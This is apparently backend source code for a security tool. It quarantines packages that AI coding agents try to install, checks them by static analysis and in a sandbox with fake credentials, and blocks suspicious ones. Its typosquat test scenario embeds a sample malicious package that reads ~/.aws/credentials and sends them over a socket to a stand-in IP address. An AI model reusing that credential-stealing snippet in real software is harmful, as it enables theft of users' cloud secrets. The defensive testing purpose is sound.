from __future__ import annotations
import asyncio
import difflib
import hashlib
import json
import os
import shutil
import time
from pathlib import Path
from typing import AsyncGenerator
from fastapi import APIRouter, HTTPException, Request, Response
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
from pydantic import BaseModel, Field

from backend.config import DATA, ROOT
from backend.cavr.storage import CavrStorage
from backend.cavr.inspector import run_action_inspection
from backend.cavr.sandbox_runner import SandboxRunner

cavr_router = APIRouter()
storage = CavrStorage()

# In-memory event queues for live SSE streaming per run
RUN_QUEUES: dict[str, list[asyncio.Queue]] = {}
RUN_METRICS: dict[str, dict] = {}
RUN_PROOFS: dict[str, dict] = {}

class InterceptRequest(BaseModel):
    package: str
    version: str = "1.0.0"
    source_code: str | None = None
    expected_hash: str | None = None
    scenario_type: str = "custom" # "safe", "typosquat", "hash_mismatch", "clean_new"

class AlternativeApprovalRequest(BaseModel):
    run_id: str
    package: str
    alternative: str
    approved: bool
    user: str = "Security Operator (Admin)"
    reason: str = "Operator reviewed alternative dependency"

def publish_event(run_id: str, event_type: str, data: dict):
    payload = {
        "run_id": run_id,
        "type": event_type,
        "timestamp": time.time(),
        "data": data
    }
    if run_id in RUN_QUEUES:
        for q in RUN_QUEUES[run_id]:
            q.put_nowait(payload)

def find_best_alternative(pkg_name: str, trusted_pkgs: list[dict], findings: list[dict]) -> dict:
    # 1. Check if typosquat target was flagged
    for f in findings:
        if f.get("category") in ("typosquatting", "homoglyph_attack") and f.get("trusted_target"):
            match = next((t for t in trusted_pkgs if t["name"].lower() == f["trusted_target"].lower()), None)
            if match:
                return {
                    "package": match["name"],
                    "version": match["version"],
                    "sha256": match["sha256"],
                    "capabilities": match.get("capabilities", "Standard library API"),
                    "confidence": "High (Direct typosquat homoglyph match)",
                    "reason": f"Directly replaces misspelled/typosquatted '{pkg_name}' with verified package '{match['name']}'"
                }

    # 2. String similarity & capability match
    scored = []
    for t in trusted_pkgs:
        ratio = difflib.SequenceMatcher(None, pkg_name.lower(), t["name"].lower()).ratio()
        # boost if common capability words overlap
        boost = 0.0
        if any(w in pkg_name.lower() for w in ("http", "req", "net", "web", "fetch")) and "http" in t.get("capabilities", "").lower():
            boost += 0.3
        if any(w in pkg_name.lower() for w in ("pdf", "doc", "invoice")) and "pdf" in t.get("capabilities", "").lower():
            boost += 0.4
        scored.append((ratio + boost, t))

    scored.sort(key=lambda x: x[0], reverse=True)
    best = scored[0][1] if scored else trusted_pkgs[0]
    return {
        "package": best["name"],
        "version": best["version"],
        "sha256": best["sha256"],
        "capabilities": best.get("capabilities", "Standard verified library"),
        "confidence": "Moderate (Capability and naming proximity match)",
        "reason": f"Recommends verified alternative '{best['name']}' matching declared capability intent"
    }

# ----------------- PEP 503 PACKAGE INDEX -----------------
@cavr_router.get("/simple/", response_class=HTMLResponse)
def pep503_root():
    pkgs = storage.get_trusted_packages()
    links = "".join([f'<a href="/simple/{p["name"]}/">{p["name"]}</a>\n' for p in pkgs])
    return f"""<!DOCTYPE html>
<html>
<head><title>ASENT Local PEP 503 Package Index</title></head>
<body>
<h1>ASENT Secure Package Index</h1>
{links}
</body>
</html>"""

@cavr_router.get("/simple/{package}/", response_class=HTMLResponse)
def pep503_package_index(package: str):
    trusted = storage.get_trusted_package(package)
    if not trusted:
        # Check quarantine
        return HTMLResponse(
            f"""<!DOCTYPE html><html><body><h1>Links for {package}</h1><p>No verified distributions available</p></body></html>""",
            status_code=404
        )
    filename = f"{trusted['name']}-{trusted['version']}-py3-none-any.whl"
    sha = trusted["sha256"]
    return f"""<!DOCTYPE html>
<html>
<head><title>Links for {package}</title></head>
<body>
<h1>Links for {package}</h1>
<a href="/simple/{package}/{filename}#sha256={sha}">{filename}</a>
</body>
</html>"""

@cavr_router.get("/simple/{package}/{filename}")
def pep503_download(package: str, filename: str):
    trusted = storage.get_trusted_package(package)
    if trusted:
        return JSONResponse({"status": "RELEASED", "package": package, "filename": filename, "sha256": trusted["sha256"]})
    
    # Check if blocked in quarantine
    raise HTTPException(
        status_code=403,
        detail={
            "error": "BLOCKED_BY_AGENT_SENTINEL",
            "package": package,
            "filename": filename,
            "reason": "Hostile/unverified package blocked by ASENT assurance gate. Unauthorized installation rejected."
        }
    )

# ----------------- CAVR CORE API -----------------
@cavr_router.get("/api/cavr/cache")
def get_cache():
    return storage.get_trusted_packages()

@cavr_router.post("/api/cavr/cache")
def add_cache(name: str, version: str, sha256: str, source: str = "PyPI Verified", capabilities: str = ""):
    return storage.add_trusted_package(name, version, sha256, source, capabilities)

@cavr_router.get("/api/cavr/dialog/cache")
def dialog_cache():
    pkgs = storage.get_trusted_packages()
    return {
        "title": "Trusted Package Cache",
        "description": "Cryptographically pinned and verified Python packages safe for AI coding agents.",
        "packages": pkgs,
        "total_packages": len(pkgs)
    }

@cavr_router.get("/api/cavr/dialog/action")
def dialog_action():
    return {
        "title": "Action: Static AST Inspection & Anomaly Detection",
        "subtitle": "Deep lexical, syntax tree, and metadata validation before sandbox dispatch",
        "inspection_steps": [
            {
                "step": "AST Sinks & Primitives Analysis",
                "detail": "Detects invocations of eval(), exec(), os.system(), subprocess.Popen, raw socket creation, and dynamic __import__."
            },
            {
                "step": "Obfuscation & Payload Detection",
                "detail": "Identifies base64 encoded strings, reversed shell commands, and hex decoded execution fragments."
            },
            {
                "step": "Setup.py Install Hooks",
                "detail": "Inspects setup.py for custom cmdclass overrides and install-time execution vectors."
            },
            {
                "step": "Typosquatting & Homoglyph Checks",
                "detail": "Calculates Levenshtein edit distance and unicode homoglyph visual lookalikes against trusted cache names."
            },
            {
                "step": "Metadata Sanity Checks",
                "detail": "Detects abnormal major version jumps (>90), missing licenses, and unpinned direct URL dependencies."
            }
        ],
        "possible_outcomes": [
            {
                "verdict": "ALLOW",
                "meaning": "Zero high/critical AST findings and legitimate metadata. Fast-tracked or cleanly tested.",
                "color": "good"
            },
            {
                "verdict": "NEEDS_REVIEW",
                "meaning": "Medium severity anomalies detected (e.g., missing license, unhandled minor warnings). Requires security operator triage.",
                "color": "warn"
            },
            {
                "verdict": "BLOCK",
                "meaning": "Critical finding detected (arbitrary command execution, typosquat attempt, or obfuscated payload). Immediately quarantined.",
                "color": "bad"
            }
        ]
    }

@cavr_router.get("/api/cavr/dialog/environment")
def dialog_environment():
    return {
        "title": "Environment: Multi-Layer Hostile Code Sandbox",
        "subtitle": "Disposable containerized isolation preventing escape and monitoring syscalls",
        "dockerfile_summary": {
            "base_image": "python:3.12-slim",
            "user": "sandbox (UID: 10001, unprivileged non-root)",
            "observation_layer": "sys.addaudithook + optional strace syscall tracer",
            "harness": "/opt/asent/harness.py"
        },
        "lockdown_flags": [
            {"flag": "--network none", "name": "Network Isolation", "desc": "All socket creation and external egress is disabled."},
            {"flag": "--read-only", "name": "Read-Only Root Filesystem", "desc": "Container rootfs cannot be written to or modified."},
            {"flag": "--tmpfs /scratch:rw,noexec,nosuid,size=64m", "name": "Ephemeral Scratchpad", "desc": "Disposable memory-backed storage with execution disabled."},
            {"flag": "--user 10001:10001", "name": "Non-Root Context", "desc": "Prevents UID 0 privilege escalation attacks."},
            {"flag": "--cap-drop ALL", "name": "Drop All Linux Capabilities", "desc": "Removes NET_RAW, SYS_ADMIN, and raw system control capabilities."},
            {"flag": "--security-opt no-new-privileges", "name": "No Privilege Gain", "desc": "Disallows setuid / setgid binary privilege elevation."},
            {"flag": "--security-opt seccomp=asent-seccomp.json", "name": "Seccomp Filter", "desc": "Restricts allowable kernel syscalls to minimal safe set."},
            {"flag": "--memory 256m --cpus 0.5 --pids-limit 64", "name": "Resource Quotas", "desc": "Hard limits preventing denial-of-service, fork bombs, and CPU hogging."},
            {"flag": "timeout 30s", "name": "Hard Watchdog Timeout", "desc": "Process is forcibly killed if execution exceeds 30 seconds."}
        ],
        "tests_run": [
            "Artifact SHA-256 hash re-verification",
            "Planting fake honeytoken credentials (~/.aws/credentials, AWS_SECRET_ACCESS_KEY)",
            "Zero-index throwaway installation",
            "Import execution test and declared contract callable verification",
            "Real-time telemetry interception via sys.addaudithook"
        ],
        "honest_limitations": "Under our honesty rule, an ALLOW outcome is always presented as 'No malicious behavior observed under our tests'. It never claims 'proven safe', recognizing heuristic bounds."
    }

@cavr_router.post("/api/cavr/intercept-command")
def intercept_command(body: dict):
    # Called by pip shim
    cmd = body.get("command", "")
    pkgs = body.get("packages", [])
    run_id = f"cmd-{int(time.time()*1000)}"
    storage.record_audit(run_id, ",".join(pkgs), "CLI_INTERCEPT", "Agent Process", f"Captured command: {cmd}")
    return {"status": "RECORDED", "run_id": run_id}

@cavr_router.get("/api/cavr/proof/{run_id}")
def get_proof(run_id: str):
    if run_id in RUN_PROOFS:
        return RUN_PROOFS[run_id]
    raise HTTPException(404, "Proof not found for run")

@cavr_router.post("/api/cavr/approve-alternative")
def approve_alternative(body: AlternativeApprovalRequest):
    action = "APPROVE_ALTERNATIVE" if body.approved else "REJECT_ALTERNATIVE"
    storage.record_audit(body.run_id, body.package, action, body.user, f"{action} for {body.alternative}: {body.reason}")
    storage.update_quarantine_decision(body.run_id, "APPROVED_ALTERNATIVE" if body.approved else "REJECTED_ALTERNATIVE")
    publish_event(body.run_id, "alternative.decision", {
        "run_id": body.run_id,
        "package": body.package,
        "alternative": body.alternative,
        "approved": body.approved,
        "user": body.user
    })
    return {"status": "SUCCESS", "action": action, "alternative": body.alternative, "approved": body.approved}

@cavr_router.get("/api/cavr/stream/{run_id}")
async def cavr_stream(run_id: str, request: Request):
    q: asyncio.Queue = asyncio.Queue()
    if run_id not in RUN_QUEUES:
        RUN_QUEUES[run_id] = []
    RUN_QUEUES[run_id].append(q)

    async def event_generator() -> AsyncGenerator[str, None]:
        try:
            while not await request.is_disconnected():
                try:
                    ev = await asyncio.wait_for(q.get(), timeout=1.0)
                    yield f"data: {json.dumps(ev)}\n\n"
                except asyncio.TimeoutError:
                    yield ": heartbeat\n\n"
        finally:
            if run_id in RUN_QUEUES and q in RUN_QUEUES[run_id]:
                RUN_QUEUES[run_id].remove(q)

    return StreamingResponse(event_generator(), media_type="text/event-stream")

# ----------------- WORKFLOW SIMULATOR & RUNNER -----------------
@cavr_router.post("/api/cavr/intercept")
async def run_intercept_workflow(body: InterceptRequest):
    run_id = f"cavr-{int(time.time()*1000)}"
    RUN_QUEUES[run_id] = []

    # Prepare package source & metadata
    pkg_name = body.package.strip()
    pkg_ver = body.version.strip()
    scenario = body.scenario_type

    # Sample predefined scenarios if no source provided
    source_code = body.source_code
    if not source_code:
        if scenario == "typosquat" or pkg_name in ("reqeusts", "requests-security", "collorama", "urllib4"):
            source_code = f"""# Suspicious package imitating legitimate library
import os, socket, base64

def extract_invoice_text(pdf_bytes):
    # Attempt credential harvesting
    aws_cred = os.path.expanduser('~/.aws/credentials')
    if os.path.exists(aws_cred):
        with open(aws_cred, 'r') as f:
            secret = f.read()
    # Attempt exfiltration connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('198.51.100.24', 443))
        s.sendall(secret.encode())
        s.close()
    except Exception:
        pass
    return "Extracted Invoice Data"
"""
        elif scenario == "hash_mismatch":
            source_code = f"""# Altered artifact with tampered checksum
import os
def extract_invoice_text(pdf_bytes):
    return "Tampered code injected"
"""
        elif scenario == "safe" or pkg_name in ("requests", "pypdf", "urllib3"):
            source_code = f"""# Clean standard utility
def extract_invoice_text(pdf_bytes):
    return "Clean invoice text extraction"
"""
        else:
            source_code = f"""# New proposed package
def extract_invoice_text(pdf_bytes):
    return "Verified clean payload"
"""

    # Compute artifact SHA-256
    artifact_hash = hashlib.sha256(source_code.encode()).hexdigest()
    if scenario == "hash_mismatch":
        expected_hash = "0000000000000000000000000000000000000000000000000000000000000000"
    else:
        expected_hash = body.expected_hash or artifact_hash

    # Save to quarantine folder (read-only)
    quarantine_dir = Path(DATA) / "quarantine" / run_id
    quarantine_dir.mkdir(parents=True, exist_ok=True)
    pkg_file = quarantine_dir / f"{pkg_name}.py"
    pkg_file.write_text(source_code)
    try:
        os.chmod(pkg_file, 0o444)
    except Exception:
        pass

    storage.record_quarantine(run_id, pkg_name, pkg_ver, artifact_hash, str(pkg_file), status="QUARANTINED")

    # Launch workflow asynchronously in background
    asyncio.create_task(execute_cavr_pipeline(
        run_id=run_id,
        pkg_name=pkg_name,
        pkg_ver=pkg_ver,
        artifact_hash=artifact_hash,
        expected_hash=expected_hash,
        source_code=source_code,
        quarantine_dir=quarantine_dir,
        scenario=scenario
    ))

    return {
        "run_id": run_id,
        "package": pkg_name,
        "version": pkg_ver,
        "sha256": artifact_hash,
        "quarantine_dir": str(quarantine_dir),
        "status": "INTERCEPTED",
        "stream_url": f"/api/cavr/stream/{run_id}"
    }

async def execute_cavr_pipeline(
    run_id: str,
    pkg_name: str,
    pkg_ver: str,
    artifact_hash: str,
    expected_hash: str,
    source_code: str,
    quarantine_dir: Path,
    scenario: str
):
    # Step 1: INTERCEPTED
    publish_event(run_id, "state_change", {
        "state": "INTERCEPTED",
        "step_index": 0,
        "message": f"Package '{pkg_name}=={pkg_ver}' intercepted via ASENT PEP 503 index and quarantine.",
        "plain_explanation": f"The AI agent tried to install '{pkg_name}'. ASENT intercepted the request before it could touch your machine."
    })
    await asyncio.sleep(0.7)

    # Step 2: CACHE_CHECK
    publish_event(run_id, "state_change", {
        "state": "CACHE_CHECK",
        "step_index": 3,
        "message": "Checking against SQLite trusted_packages table...",
        "plain_explanation": "Looking up the package in our database of known safe packages."
    })
    await asyncio.sleep(0.6)

    trusted = storage.get_trusted_package(pkg_name, pkg_ver)
    trusted_all = storage.get_trusted_packages()
    trusted_names = [t["name"] for t in trusted_all]

    is_cache_hit = False
    is_hash_mismatch = False

    if trusted:
        if trusted["sha256"].lower() == artifact_hash.lower() and scenario != "hash_mismatch":
            is_cache_hit = True
        else:
            is_hash_mismatch = True

    if is_cache_hit:
        publish_event(run_id, "cache_result", {"result": "HIT", "package": pkg_name, "sha256": artifact_hash})
        publish_event(run_id, "state_change", {
            "state": "ALLOWED",
            "step_index": 7,
            "message": "Cache HIT: Cryptographic hash matches pre-verified record. Skipping hostile sandbox.",
            "plain_explanation": "This exact file has already been verified and trusted. It is safe to release.",
            "verdict": "ALLOW",
            "honesty_wording": "No malicious behavior observed under our tests (Verified cache record)."
        })
        storage.update_quarantine_decision(run_id, "ALLOW")
        return

    # Cache MISS or HASH_MISMATCH -> Proceed to Action & Sandbox
    cache_status = "HASH_MISMATCH" if is_hash_mismatch else "MISS"
    publish_event(run_id, "cache_result", {
        "result": cache_status,
        "package": pkg_name,
        "sha256": artifact_hash,
        "reason": "Cryptographic hash mismatch! Possible package tampering." if is_hash_mismatch else "Package not found in trusted cache."
    })
    await asyncio.sleep(0.7)

    # Step 3: INSPECTING (Action box)
    publish_event(run_id, "state_change", {
        "state": "INSPECTING",
        "step_index": 4,
        "message": "Action Box Active: Running Python AST analysis, typosquatting checks, and metadata sanity...",
        "plain_explanation": "Examining the code for dangerous patterns like backdoor scripts, typosquatting, or hidden code."
    })

    metadata = {"version": pkg_ver, "license": "MIT" if scenario == "safe" else "Unknown"}
    inspection = run_action_inspection(
        package_name=pkg_name,
        version=pkg_ver,
        source_code=source_code,
        metadata=metadata,
        trusted_names=trusted_names
    )
    publish_event(run_id, "inspection_findings", inspection)
    await asyncio.sleep(0.9)

    # Step 4: SANDBOXING (Environment box)
    publish_event(run_id, "state_change", {
        "state": "SANDBOXING",
        "step_index": 5,
        "message": "Environment Box Active: Dispatching to asent-sandbox with honeytokens and sys.addaudithook...",
        "plain_explanation": "Starting a locked-down container with fake secrets to see if the package tries to steal data."
    })

    runner = SandboxRunner()
    
    def on_log(line: str):
        publish_event(run_id, "sandbox_log", {"line": line})
        # If honeytoken or network caught, stream live meter update
        if "Honeytoken" in line or "HONEYTOKEN" in line:
            publish_event(run_id, "honeytoken_flash", {"triggered": True, "line": line})

    # Run sandbox execution
    exec_result = await asyncio.to_thread(runner.run, quarantine_dir, run_id, on_log)
    report = exec_result.get("report") or {}
    metrics = report.get("metrics", {})

    publish_event(run_id, "sandbox_metrics", metrics)
    await asyncio.sleep(0.8)

    # Step 5: VERDICT
    # Deterministic verdict rules
    critical_static = any(f["severity"] == "critical" for f in inspection["findings"])
    is_blocked = (
        is_hash_mismatch or
        critical_static or
        metrics.get("network_attempts", 0) > 0 or
        metrics.get("honeytoken_accessed", False) or
        metrics.get("writes_outside_scratch", 0) > 0
    )
    is_review = not is_blocked and (
        inspection.get("suggested_action") == "NEEDS_REVIEW" or
        metrics.get("processes_spawned", 0) > 0
    )

    final_verdict = "BLOCK" if is_blocked else ("NEEDS_REVIEW" if is_review else "ALLOW")
    
    # Reason and evidence lines
    evidence_lines = []
    if is_hash_mismatch:
        evidence_lines.append(f"Hash Mismatch: computed '{artifact_hash[:16]}...' does not match cache record.")
    for f in inspection["findings"]:
        if f["severity"] in ("critical", "high"):
            evidence_lines.append(f"AST Anomaly: {f['message']}")
    if metrics.get("honeytoken_accessed"):
        evidence_lines.append("Telemetry: Unauthorized access attempt to ~/.aws/credentials (Honeytoken triggered).")
    if metrics.get("network_attempts", 0) > 0:
        evidence_lines.append(f"Telemetry: Intercepted {metrics['network_attempts']} prohibited network socket connection attempts.")
    if metrics.get("writes_outside_scratch", 0) > 0:
        evidence_lines.append(f"Telemetry: Prevented {metrics['writes_outside_scratch']} file writes outside /scratch temporary filesystem.")

    if not evidence_lines and final_verdict == "ALLOW":
        evidence_lines.append("Clean execution: 0 network attempts, 0 unauthorized file touches, 0 honeytoken triggers.")

    # Alternative recommendation on BLOCK
    alternative = None
    if final_verdict == "BLOCK":
        alternative = find_best_alternative(pkg_name, trusted_all, inspection["findings"])

    verdict_data = {
        "verdict": final_verdict,
        "reason": "Hostile/unauthorized behavior detected during multi-layer assurance tests" if final_verdict == "BLOCK" else "Clean behavior observed under our tests",
        "honesty_wording": "No malicious behavior observed under our tests" if final_verdict == "ALLOW" else "Security policy violations detected",
        "evidence_lines": evidence_lines,
        "alternative_package": alternative,
        "metrics": metrics,
        "proof_available": True
    }

    # Store proof data
    RUN_PROOFS[run_id] = {
        "run_id": run_id,
        "package": pkg_name,
        "version": pkg_ver,
        "docker_command": exec_result["docker_command"],
        "container_id": exec_result["container_id"],
        "image_digest": exec_result["image_digest"],
        "hash_comparison": {
            "declared_or_expected": expected_hash,
            "actual_sha256": artifact_hash,
            "matches": artifact_hash.lower() == expected_hash.lower()
        },
        "verdict": final_verdict,
        "evidence_lines": evidence_lines,
        "evidence_json": {
            "run_id": run_id,
            "package": pkg_name,
            "version": pkg_ver,
            "verdict": final_verdict,
            "timestamp": time.time(),
            "inspection": inspection,
            "sandbox_report": report,
            "alternative": alternative
        }
    }

    publish_event(run_id, "verdict_computed", verdict_data)

    # Step 6: RELEASE OR BLOCK
    next_state = "RELEASED" if final_verdict == "ALLOW" else "ALT_RECOMMENDED"
    publish_event(run_id, "state_change", {
        "state": next_state,
        "step_index": 7 if final_verdict == "ALLOW" else 6,
        "message": f"Verdict: {final_verdict}. " + ("Artifact released to agent environment." if final_verdict == "ALLOW" else "Artifact quarantined. Alternative recommended awaiting human approval."),
        "plain_explanation": ("Everything looked safe, so we allowed the package to be used." if final_verdict == "ALLOW" else f"We blocked the package because it tried to do things it shouldn't. We suggest using '{alternative['package'] if alternative else 'a trusted alternative'}' instead."),
        "verdict": final_verdict
    })
    storage.update_quarantine_decision(run_id, final_verdict)
